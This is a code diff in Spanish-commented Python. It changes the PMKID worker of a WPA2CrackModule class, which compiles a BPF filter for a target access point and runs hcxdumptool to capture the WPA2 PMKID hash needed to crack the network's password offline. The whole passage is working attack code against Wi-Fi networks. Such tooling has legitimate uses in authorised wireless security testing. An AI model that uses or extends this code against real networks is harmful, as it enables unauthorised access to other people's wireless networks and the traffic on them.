@@ -124,18 +124,34 @@ class WPA2CrackModule:
     def _pmkid_worker(self, target_bssid: str):
         bssid_clean = target_bssid.replace(":", "").lower()
 
-        # Archivo de filtro para hcxdumptool
-        with open(FILTER_FILE, "w") as f:
-            f.write(bssid_clean + "\n")
+        # hcxdumptool 7.1.x usa BPF para filtrar por BSSID (addr3 = BSSID en mgmt frames)
+        # Compilar el filtro BPF y guardarlo en archivo
+        bpf_expr = f"wlan addr3 {bssid_clean}"
+        bpf_compile_cmd = ["hcxdumptool", f"--bpfc={bpf_expr}"]
+        try:
+            bpf_result = subprocess.run(bpf_compile_cmd, capture_output=True, text=True)
+            bpf_code = bpf_result.stdout.strip()
+            if not bpf_code:
+                bpf_code = bpf_result.stderr.strip()
+            with open(FILTER_FILE, "w") as f:
+                f.write(bpf_code + "\n")
+            self._log(f"[*] BPF filter compilado para {target_bssid}")
+        except Exception as e:
+            self._log(f"[!] No se pudo compilar BPF, capturando sin filtro: {e}")
+            FILTER_FILE_USE = None
+        else:
+            FILTER_FILE_USE = FILTER_FILE
 
         cmd = [
             "hcxdumptool",
             "-i", self.interface,
             "-w", PMKID_PCAPNG,
-            "--filterlist_ap", FILTER_FILE,
-            "--filtermode", "2",
-            "--rds=1",
+            "--rds=2",
+            "--exitoneapol=1",
+            f"--tot={PMKID_TIMEOUT // 60 + 1}",
         ]
+        if FILTER_FILE_USE and bpf_code:
+            cmd += ["--bpf", FILTER_FILE_USE]
 
         self._log(f"[*] PMKID Attack → BSSID: {target_bssid}")
         self._log(f"[*] Timeout: {PMKID_TIMEOUT}s. Capturando hash WPA2...")
